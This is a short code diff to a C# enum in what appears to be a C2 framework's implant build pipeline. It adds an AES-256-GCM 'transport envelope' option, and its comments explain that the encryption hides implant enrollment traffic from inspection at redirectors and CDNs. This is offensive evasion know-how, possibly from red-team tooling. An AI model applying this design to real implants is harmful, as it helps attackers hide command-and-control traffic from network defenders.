@@ -4,10 +4,14 @@ namespace Rod.BuildPipeline.PayloadBuild;
 /// How the enroll JSON body is shaped on the wire. <see cref="None"/> sends the
 /// raw JSON document; <see cref="Base64"/> wraps it as a single base64 string so
 /// the request body no longer looks like a structured C2 message -- a classic
-/// malleable-transport transform (architecture.md Sec 7). The teamserver-side
-/// enroll endpoint understands both shapes (it decodes the envelope before
-/// binding), so an envelope-profiled implant enrolls against a stock deployment
-/// with no unwrapping edge in front of it.
+/// malleable-transport transform (architecture.md Sec 7). <see cref="AesGcm"/>
+/// goes further: the body is a single base64 string wrapping AES-256-GCM
+/// ciphertext under a per-artifact key minted at build, so the request stays
+/// opaque even where TLS terminates early (a redirector, a fronting CDN, a
+/// hold of decrypted traffic). The teamserver-side enroll endpoint understands
+/// every shape (it decodes the envelope before binding), so an
+/// envelope-profiled implant enrolls against a stock deployment with no
+/// unwrapping edge in front of it.
 /// </summary>
 public enum TransportEnvelope
 {
@@ -16,6 +20,14 @@ public enum TransportEnvelope
 
     /// <summary>Wrap the enroll JSON body as a single base64 string.</summary>
     Base64 = 1,
+
+    /// <summary>
+    /// Wrap the enroll JSON body as AES-256-GCM ciphertext (itself base64 in a
+    /// JSON string) under the per-artifact envelope key the build mints, bakes
+    /// into the artifact, and records beside the stored payload for the
+    /// teamserver's own decode.
+    /// </summary>
+    AesGcm = 2,
 }
 
 /// <summary>
